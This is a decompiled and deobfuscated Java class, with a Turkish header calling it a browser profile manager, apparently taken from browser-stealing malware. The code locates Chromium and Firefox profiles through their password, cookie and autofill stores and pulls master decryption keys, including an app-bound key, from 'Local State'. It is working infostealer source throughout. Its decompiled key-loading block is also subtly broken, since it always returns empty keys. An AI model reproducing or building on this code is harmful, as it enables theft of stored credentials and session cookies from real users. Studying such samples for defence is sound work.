/*\n * ========================================\n * DEOBFUSCATED: BrowserProfile.java\n * Original: c/e.java\n * ----------------------------------------\n * Browser profil yöneticisi - master key ve profil dizinlerini keşfeder\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.e$Info;
import c.f;
import c.g;
import c.g$MasterKeys;
import c.r;
import java.io.File;

public final class e {
    private final e$Info a;
    private final g$MasterKeys b;
    private final f[] c;

    public e(e$Info e$Info) {
        this.a = e$Info;
        this.b = this.getNewMasterKeys();
        this.c = this.getNewProfiles();
    }

    public e(e$Info e$Info, g$MasterKeys g$MasterKeys) {
        this.a = e$Info;
        this.b = g$MasterKeys != null && g$MasterKeys.hasAny() ? g$MasterKeys : this.getNewMasterKeys();
        this.c = this.getNewProfiles();
    }

    public e$Info getInfo() {
        return this.a;
    }

    public g$MasterKeys getMasterKeys() {
        return this.b;
    }

    public byte[] getDecryptionKey() {
        return this.b != null ? this.b.primaryKey() : null;
    }

    public f[] getProfiles() {
        return this.c;
    }

    private g$MasterKeys getNewMasterKeys() {
        try {
            File file = new File(this.a.c, "Local State" /* r.ls() */);
            if (file.isFile()) {
                return g.getMasterKeys(file, this.a.getAbeKey());
            }
        }
        finally {
            return new g$MasterKeys(null, null);
        }
        {
        }
    }

    private f[] getNewProfiles() {
        File[] fileArray = this.getProfileDirectories();
        if (fileArray == null || fileArray.length == 0) {
            return null;
        }
        f[] fArray = new f[fileArray.length];
        for (int i2 = 0; i2 < fileArray.length; ++i2) {
            fArray[i2] = new f(this, fileArray[i2]);
        }
        return fArray;
    }

    private File[] getProfileDirectories() {
        if (!this.a.c.exists() || !this.a.c.isDirectory()) {
            return null;
        }
        if (this.a.isSingleProfile() || this.a.c.getName().contains("Opera") || this.a.c.getName().contains("Yandex")) {
            boolean bl;
            boolean bl2 = bl = new File(this.a.c, "Cookies" /* r.ckf() */).isFile() || new File(this.a.c, "Network" /* r.nt() */ + File.separator + "Cookies" /* r.ckf() */).isFile() || new File(this.a.c, "Login Data" /* r.ld() */).isFile() || new File(this.a.c, "Web Data" /* r.wd() */).isFile();
            if (bl) {
                return new File[]{this.a.c};
            }
        }
        if (this.a.isFirefox()) {
            return this.a.c.listFiles(e::lambda$getProfileDirectories$0);
        }
        File[] fileArray = this.a.c.listFiles(e::lambda$getProfileDirectories$1);
        if (fileArray == null || fileArray.length == 0) {
            boolean bl;
            boolean bl3 = bl = new File(this.a.c, "Cookies" /* r.ckf() */).isFile() || new File(this.a.c, "Network" /* r.nt() */ + File.separator + "Cookies" /* r.ckf() */).isFile() || new File(this.a.c, "Login Data" /* r.ld() */).isFile() || new File(this.a.c, "Web Data" /* r.wd() */).isFile();
            if (bl) {
                return new File[]{this.a.c};
            }
        }
        return fileArray;
    }

    private static boolean lambda$getProfileDirectories$1(File file) {
        if (!file.isDirectory()) {
            return false;
        }
        String string = file.getName();
        if ("System Profile".equals(string) || "Guest Profile".equals(string) || "Crashpad".equals(string) || "ShaderCache".equals(string) || "GrShaderCache".equals(string) || "WidevineCdm".equals(string) || "Extensions".equals(string) || "Local Extension Settings".equals(string)) {
            return false;
        }
        if (string.equals("Default") || string.startsWith("Profile") || string.startsWith("Person")) {
            return true;
        }
        return new File(file, "Web Data" /* r.wd() */).isFile() || new File(file, "Login Data" /* r.ld() */).isFile() || new File(file, "Cookies" /* r.ckf() */).isFile() || new File(file, "Network" /* r.nt() */ + File.separator + "Cookies" /* r.ckf() */).isFile();
    }

    private static boolean lambda$getProfileDirectories$0(File file) {
        return file.isDirectory() && !file.getName().equals("Crash Reports") && (new File(file, "cookies.sqlite" /* r.csql() */).isFile() || new File(file, "places.sqlite" /* r.psql() */).isFile() || new File(file, "logins.json" /* r.lj() */).isFile() || new File(file, "key4.db").isFile());
    }
}

